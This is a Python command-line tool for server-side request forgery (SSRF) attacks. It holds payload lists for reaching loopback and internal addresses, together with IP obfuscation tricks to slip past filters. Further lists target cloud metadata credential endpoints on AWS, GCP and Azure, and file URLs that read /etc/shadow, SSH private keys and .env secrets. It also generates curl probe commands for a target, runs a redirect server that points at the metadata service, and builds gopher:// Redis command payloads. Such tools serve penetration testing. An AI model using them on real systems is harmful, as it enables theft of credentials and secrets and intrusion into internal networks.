#!/usr/bin/env python3
"""
ssrf_helper.py — SSRF Testing Helper
Generates payloads, checks common SSRF vectors, and assists with IP obfuscation.

Usage:
    python3 ssrf_helper.py encode 127.0.0.1
    python3 ssrf_helper.py payloads
    python3 ssrf_helper.py cloud
    python3 ssrf_helper.py probe https://target.com/fetch?url=FUZZ
"""

import sys
import socket
import struct
import urllib.parse
import ipaddress

# ─── IP Obfuscation ──────────────────────────────────────────────────────────

def encode_ip(ip: str) -> dict:
    """Return all obfuscated forms of an IPv4 address."""
    try:
        packed = socket.inet_aton(ip)
        decimal = struct.unpack("!I", packed)[0]
        parts = ip.split(".")
        octal = ".".join(f"0{int(p):o}" for p in parts)
        hex_str = "0x" + "".join(f"{int(p):02x}" for p in parts)
        hex_dotted = ".".join(f"0x{int(p):02x}" for p in parts)
    except OSError:
        print(f"[!] Invalid IP address: {ip}")
        sys.exit(1)

    return {
        "original": ip,
        "decimal": str(decimal),
        "octal": octal,
        "hex": hex_str,
        "hex_dotted": hex_dotted,
        "ipv6_mapped": f"::ffff:{ip}",
        "ipv6_mapped_bracket": f"[::ffff:{ip}]",
        "short": _short_form(parts),
    }

def _short_form(parts: list) -> str:
    """127.0.0.1 → 127.1, 10.0.0.1 → 10.1"""
    while len(parts) > 2 and parts[-2] == "0":
        parts = parts[:-2] + [parts[-1]]
    return ".".join(parts) if len(parts) < 4 else ".".join(parts)


def print_encodings(ip: str):
    enc = encode_ip(ip)
    print(f"\n[+] IP obfuscation variants for: {ip}\n")
    width = 20
    for key, val in enc.items():
        if key == "original":
            continue
        urls = [
            f"http://{val}/",
            f"http://{val}:80/",
        ]
        print(f"  {'[' + key + ']':<{width}} {val}")
        for u in urls:
            print(f"  {'':>{width}}   → {u}")
    print()


# ─── Payload Lists ───────────────────────────────────────────────────────────

LOCALHOST_PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://2130706433/",          # decimal 127.0.0.1
    "http://0177.0.0.1/",          # octal
    "http://0x7f.0x0.0x0.0x1/",   # hex dotted
    "http://0x7f000001/",          # hex
    "http://127.1/",
    "http://[::ffff:127.0.0.1]/",
    "http://localhost.localdomain/",
    "http://127.0.0.1%09/",        # tab bypass
    "http://127.0.0.1%00/",        # null byte
]

INTERNAL_PAYLOADS = [
    "http://10.0.0.1/",
    "http://10.1.1.1/",
    "http://172.16.0.1/",
    "http://192.168.1.1/",
    "http://192.168.0.1/",
]

CLOUD_PAYLOADS = {
    "AWS IMDSv1": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/meta-data/public-keys/",
    ],
    "AWS IMDS (encoded)": [
        "http://2852039166/latest/meta-data/",           # decimal
        "http://0xa9fea9fe/latest/meta-data/",           # hex
        "http://169.254.169.254.nip.io/latest/meta-data/",
    ],
    "GCP": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://169.254.169.254/computeMetadata/v1/",
    ],
    "Azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ],
    "DigitalOcean": [
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/v1/account-keys",
    ],
}

FILE_PAYLOADS = [
    "file:///etc/passwd",
    "file:///etc/shadow",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///app/.env",
    "file:///var/www/html/.env",
    "file:///root/.ssh/id_rsa",
    "file:///home/ubuntu/.ssh/id_rsa",
    "file:///etc/hosts",
]

HIGH_VALUE_PORTS = {
    22: "SSH",
    80: "HTTP",
    443: "HTTPS",
    3306: "MySQL",
    5432: "PostgreSQL",
    6379: "Redis",
    8080: "HTTP-alt / Jenkins",
    8443: "HTTPS-alt",
    9200: "Elasticsearch",
    9090: "Prometheus",
    27017: "MongoDB",
    2375: "Docker daemon (unauthenticated!)",
    6443: "Kubernetes API",
    8500: "Consul",
    3000: "Grafana",
}


def print_payloads():
    print("\n[+] SSRF Payload Cheatsheet\n")
    print("=== Localhost / Loopback ===")
    for p in LOCALHOST_PAYLOADS:
        print(f"  {p}")
    print("\n=== Internal Network ===")
    for p in INTERNAL_PAYLOADS:
        print(f"  {p}")
    print("\n=== File Read ===")
    for p in FILE_PAYLOADS:
        print(f"  {p}")
    print()


def print_cloud():
    print("\n[+] Cloud Metadata SSRF Payloads\n")
    for provider, payloads in CLOUD_PAYLOADS.items():
        print(f"=== {provider} ===")
        for p in payloads:
            print(f"  {p}")
        print()


def print_port_scan(target_ip: str = "10.0.0.1"):
    print(f"\n[+] Port scan payloads for {target_ip}\n")
    print("  # Timing-based: fast response = open, timeout = filtered")
    for port, service in HIGH_VALUE_PORTS.items():
        print(f"  http://{target_ip}:{port}/   # {service}")
    print()


# ─── Probe Generator ─────────────────────────────────────────────────────────

def generate_probe_commands(template: str):
    """Generate curl commands replacing FUZZ in template URL."""
    if "FUZZ" not in template:
        print("[!] Template must contain FUZZ placeholder.")
        sys.exit(1)

    print(f"\n[+] Generated probe commands for: {template}\n")
    all_payloads = (
        LOCALHOST_PAYLOADS[:5]
        + ["http://169.254.169.254/latest/meta-data/iam/security-credentials/"]
        + INTERNAL_PAYLOADS[:3]
        + FILE_PAYLOADS[:3]
    )

    for payload in all_payloads:
        encoded = urllib.parse.quote(payload, safe="")
        url = template.replace("FUZZ", encoded)
        print(f"  curl -s '{url}'")
    print()


# ─── Redirect Server ─────────────────────────────────────────────────────────

def start_redirect_server(port: int = 8888, redirect_to: str = "http://169.254.169.254/latest/meta-data/"):
    """Start a simple HTTP server that 302 redirects to internal target."""
    import http.server

    class RedirectHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(302)
            self.send_header("Location", redirect_to)
            self.end_headers()
            print(f"  [hit] {self.client_address[0]} → {redirect_to}")

        def log_message(self, *args):
            pass  # silence default logging

    print(f"[+] Redirect server on :{port} → {redirect_to}")
    print(f"    Inject: http://YOUR-IP:{port}/\n    Press Ctrl+C to stop.\n")
    server = http.server.HTTPServer(("", port), RedirectHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server stopped.")


# ─── Gopher Payload Builder ──────────────────────────────────────────────────

def build_gopher_redis(host: str = "127.0.0.1", port: int = 6379, cmd: str = "INFO"):
    """Build a gopher:// URL to send a raw Redis command."""
    raw = f"*1\r\n${len(cmd)}\r\n{cmd}\r\n"
    encoded = urllib.parse.quote(raw, safe="")
    url = f"gopher://{host}:{port}/_{encoded}"
    print(f"\n[+] Gopher Redis payload\n")
    print(f"  Command : {cmd}")
    print(f"  Gopher  : {url}\n")
    return url


# ─── CLI ─────────────────────────────────────────────────────────────────────

def usage():
    print(__doc__)
    sys.exit(0)


def main():
    args = sys.argv[1:]
    if not args:
        usage()

    cmd = args[0].lower()

    if cmd == "encode":
        ip = args[1] if len(args) > 1 else "127.0.0.1"
        print_encodings(ip)

    elif cmd == "payloads":
        print_payloads()

    elif cmd == "cloud":
        print_cloud()

    elif cmd == "portscan":
        target = args[1] if len(args) > 1 else "10.0.0.1"
        print_port_scan(target)

    elif cmd == "probe":
        template = args[1] if len(args) > 1 else None
        if not template:
            print("[!] Usage: ssrf_helper.py probe 'https://target.com/fetch?url=FUZZ'")
            sys.exit(1)
        generate_probe_commands(template)

    elif cmd == "redirect":
        port = int(args[1]) if len(args) > 1 else 8888
        dest = args[2] if len(args) > 2 else "http://169.254.169.254/latest/meta-data/"
        start_redirect_server(port, dest)

    elif cmd == "gopher-redis":
        host = args[1] if len(args) > 1 else "127.0.0.1"
        port = int(args[2]) if len(args) > 2 else 6379
        redis_cmd = args[3] if len(args) > 3 else "INFO"
        build_gopher_redis(host, port, redis_cmd)

    elif cmd in ("help", "--help", "-h"):
        usage()

    else:
        print(f"[!] Unknown command: {cmd}")
        usage()


if __name__ == "__main__":
    main()
